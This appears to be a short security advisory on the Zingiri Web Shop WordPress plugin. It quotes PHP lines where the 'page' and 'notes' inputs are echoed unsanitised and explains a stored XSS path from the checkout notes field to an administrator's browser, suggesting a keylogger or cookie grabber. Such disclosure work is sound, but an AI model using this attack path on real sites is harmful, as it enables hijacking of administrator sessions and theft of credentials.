plugins/zingiri-web-shop/zing.inc.php

line at 401.

if ($process=='content' && $page!='ajax' && $page!='downldr') echo '<div
class="zing_ws_page" id="zing_ws_'.$_GET['page'].'">';

./fws/pages-front/onecheckout.php

line 27-29
if (!empty($_POST['notes'])) {
$notes=$_POST['notes'];
}

and line 348
<textarea name="notes" rows="5" style="width: 100%"><?php echo
$notes;?>&lt;/textarea&gt;<br />

'notes' variable isn't properly sanitized before being used.

That's very basic XSS vulnerabilities. But you dont need use fishing attack
to target webpage's administrator. That application insert datas to
database with that form. After your malicious code posted up, your
javascrip code inserted to database with $_POST['notes'] variable. When
administrator wanna see list of ordered items list. Javascript codes will
come from database and start working on Authenticated admin user side.
After that You can use browser keylogger with BT5 tools or can usee cookie
grabber.
